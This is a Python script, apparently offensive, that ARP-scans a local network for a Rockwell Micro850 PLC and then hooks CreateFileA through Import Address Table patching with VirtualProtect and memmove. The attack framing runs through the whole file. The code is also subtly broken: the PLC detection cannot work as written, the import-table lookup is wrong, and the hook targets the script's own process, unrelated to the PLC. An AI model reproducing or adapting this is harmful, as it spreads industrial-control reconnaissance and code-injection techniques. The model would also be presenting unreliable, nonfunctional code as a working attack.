import ctypes
import pefile
import mmap
import socket
import struct
from scapy.all import ARP, Ether, srp

### Step 1: Discover the PLC IP Address
def find_plc():
    target_ip_range = "192.168.1.0/24"  # Change if needed
    print("[*] Scanning for the Rockwell Micro850 PLC on network...")

    # Create an ARP request
    arp = ARP(pdst=target_ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    # Send and receive response
    result = srp(packet, timeout=2, verbose=False)[0]

    for sent, received in result:
        if "Rockwell" in received.summary():
            plc_ip = received.psrc
            print(f"[+] Found PLC at: {plc_ip}")
            return plc_ip

    print("[-] Could not identify the PLC.")
    return None

### Step 2: Perform IAT Hooking
def iat_hooking(target_dll: str, hooked_function: str, new_function_address: int):
    """
    Performs IAT hooking by modifying the function pointer in the Import Address Table of a process.
    """
    print(f"[*] Attempting to hook {hooked_function} in {target_dll}...")

    # Open the process (using our own process in this example)
    process = ctypes.windll.kernel32.GetCurrentProcess()

    # Load the target DLL
    dll_handle = ctypes.windll.kernel32.LoadLibraryA(target_dll.encode("ascii"))
    if not dll_handle:
        print(f"[-] Failed to load {target_dll}")
        return

    pe = pefile.PE(target_dll)

    for entry in pe.DIRECTORY_ENTRY_IMPORT:
        if entry.dll.decode().lower() == target_dll.lower():
            for imp in entry.imports:
                if imp.name and imp.name.decode() == hooked_function:
                    print(f"[+] Found {hooked_function} at address: {hex(imp.address)}")
                    
                    # Modify memory protections to allow writing
                    old_protection = ctypes.c_ulong()
                    ctypes.windll.kernel32.VirtualProtect(
                        imp.address, ctypes.sizeof(ctypes.c_void_p),
                        0x40, ctypes.byref(old_protection)
                    )

                    # Overwrite the function pointer
                    ctypes.memmove(imp.address, ctypes.byref(ctypes.c_void_p(new_function_address)), ctypes.sizeof(ctypes.c_void_p))

                    # Restore original protections
                    ctypes.windll.kernel32.VirtualProtect(
                        imp.address, ctypes.sizeof(ctypes.c_void_p),
                        old_protection.value, ctypes.byref(old_protection)
                    )

                    print("[+] Hooking complete!")
                    return

    print("[-] Hooking failed. Function not found.")

### Step 3: Replacement Function for Hooking
def fake_function():
    print("[!] Hooked Function Executed. Manipulated behavior!")

# Convert function to an executable memory address
new_function_address = ctypes.cast(ctypes.CFUNCTYPE(None)(fake_function), ctypes.c_void_p).value

### Run the script
if __name__ == "__main__":
    plc_ip = find_plc()
    
    if plc_ip:
        print(f"[*] Proceeding with hooking after discovering PLC IP: {plc_ip}")
        iat_hooking("kernel32.dll", "CreateFileA", new_function_address)
    else:
        print("[-] Terminating as PLC is not found.")